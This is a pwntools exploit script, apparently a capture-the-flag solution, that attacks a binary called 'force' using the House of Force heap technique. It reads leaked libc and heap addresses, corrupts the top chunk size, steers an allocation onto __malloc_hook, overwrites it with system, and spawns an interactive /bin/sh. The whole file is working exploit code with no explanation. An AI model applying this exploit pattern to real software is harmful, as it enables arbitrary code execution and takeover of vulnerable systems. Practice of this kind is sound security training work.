#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './force', checksec = False)
libc = ELF('./.glibc/glibc_2.28_no-tcache/libc.so.6', checksec = False)

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

def malloc(size, data):
    io.sendlineafter(b'Surrender', b'1')
    io.sendlineafter(b'?:', str(size).encode())
    io.sendlineafter(b'?:', data)

io = start()

io.recvuntil(b'system at')
system_leak = int(io.recvline(), 16)
libc.address = system_leak - libc.sym.system

io.recvuntil(b'else at')
heap_leak = int(io.recvline(), 16)

malloc(1, b'A' * 0x18 + p64(0xffffffffffffffff))

diff = (libc.sym.__malloc_hook - 0x20) - (heap_leak + 0x20)
info(f"0x{diff:02x} bytes to __malloc_hook")

malloc(diff, b'/bin/sh\0')
malloc(1, p64(system_leak))
malloc(heap_leak + 0x30, "")

io.interactive()